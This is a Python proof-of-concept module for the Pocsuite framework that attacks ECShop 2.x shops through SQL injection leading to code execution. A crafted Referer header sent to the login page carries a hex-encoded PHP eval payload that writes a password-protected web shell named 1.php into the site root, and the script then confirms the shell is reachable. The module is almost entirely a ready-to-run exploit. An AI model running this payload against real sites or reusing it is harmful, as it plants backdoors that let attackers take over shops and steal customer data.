#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '0'
    version = '0'
    author = 'None'
    vulDate = 'None'
    createDate = 'None'
    updateDate = 'None'
    references = ['']
    name = 'ecshop 2.X 注入造成代码执行(getshell)'
    appPowerLink = 'None'
    appName = 'ecshop'
    appVersion = '2.X'
    vulType = 'SQL Injection and Code Execution'
    desc = '''
    	ecshop2.X版本造成注入和代码执行 在根目录下生成1.php 密码1337
    '''
    samples = ['']

    def _verify(self):
        try:
            result = {}
            headers={'Referer':'''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}'''}
            att_url = self.url + "/user.php?act=login"
            response = req.get(att_url,headers=headers,timeout=10)

            res = req.get(self.url+"/1.php",timeout=10)
            if res.status_code == 200:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url+"/1.php"
        except Exception,e:
            pass
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet noting return')
        return output


register(TestPOC)
